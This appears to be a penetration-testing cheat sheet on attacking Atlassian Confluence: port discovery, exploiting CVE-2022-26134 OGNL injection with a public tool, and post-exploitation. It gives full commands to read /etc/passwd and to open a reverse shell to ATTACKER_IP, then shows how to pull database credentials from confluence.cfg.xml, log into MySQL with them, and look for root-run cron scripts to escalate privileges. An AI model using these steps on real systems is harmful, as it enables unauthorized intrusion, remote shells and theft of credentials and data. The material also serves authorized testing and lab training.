# Atlassian Confluence

Confluence commonly runs on Tomcat behind port `8090`. A second HTTP service on `8091` with `Server: Aleph/...` is often Synchrony, used by Confluence for collaborative editing.

## Discovery

```bash
nmap -sC -sV TARGET -p 8090,8091
# 8090/tcp open  http  Apache Tomcat
# http-title: Log In - Confluence
# 8091/tcp open  http  Server: Aleph/0.4.6
```

Useful paths:

```text
http://TARGET:8090/login.action
http://TARGET:8090/index.action
```

## CVE-2022-26134 - OGNL Injection

Unauthenticated OGNL injection in Confluence can allow file read and command execution. One working tool is `through_the_wire`.

```bash
git clone https://github.com/jbaines-r7/through_the_wire
cd through_the_wire
```

Read a file first to confirm exploitation:

```bash
python3 through_the_wire.py --rhost TARGET --rport 8090 --lhost ATTACKER_IP --protocol http:// --read-file /etc/passwd
```

Get a reverse shell:

```bash
python3 through_the_wire.py --rhost TARGET --rport 8090 --lhost ATTACKER_IP --protocol http:// --reverse-shell
```

The shell usually lands as the `confluence` user.

## Post Exploitation

Confluence stores database connection details in `confluence.cfg.xml`:

```bash
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
```

Look for:

```xml
<property name="hibernate.connection.url">jdbc:mysql://localhost:3306/confluence</property>
<property name="hibernate.connection.username">confluence</property>
<property name="hibernate.connection.password">PASSWORD</property>
```

Use the credentials locally:

```bash
mysql -u confluence -p'PASSWORD' confluence
mysql -u confluence -p'PASSWORD' -e "show tables;" confluence
```

Also check for backups with stricter permissions. They are worth noting for later if you escalate:

```bash
ls -la /var/atlassian/application-data/confluence/
# confluence.cfg.xml
# confluence.cfg.xml.backup
```

## Interesting Files

```text
/opt/atlassian/confluence/
/opt/atlassian/confluence/logs/
/var/atlassian/application-data/confluence/
/opt/atlassian-confluence-*.bin
```

If you see scripts near `/opt/atlassian/` owned by `confluence`, check whether root runs them from cron or a timer.
